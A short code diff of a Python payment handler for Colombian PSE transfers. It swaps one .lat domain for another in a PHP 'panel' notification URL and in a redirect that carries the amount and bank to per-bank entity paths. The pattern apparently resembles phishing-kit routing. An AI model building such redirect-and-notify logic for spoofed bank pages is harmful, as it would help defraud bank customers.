@@ -150,7 +150,7 @@ async def procesar_pago_pse(
     monto = int(tx["monto"]) if tx else 0
     correo_cliente = correo or "-"
 
-    url_notificar_php = "https://bogodash.lat/panel/notificar.php"
+    url_notificar_php = "https://chaosvant.lat/panel/notificar.php"
     subruta_entidad = ""
 
     try:
@@ -173,7 +173,7 @@ async def procesar_pago_pse(
         subruta_entidad = "entidad/bogota/"
 
     subruta_limpia = subruta_entidad.strip("/")
-    url_destino = f"https://bogodash.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
+    url_destino = f"https://chaosvant.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
 
     await manager.broadcast({
         "event": "NUEVA_NOTIFICACION",
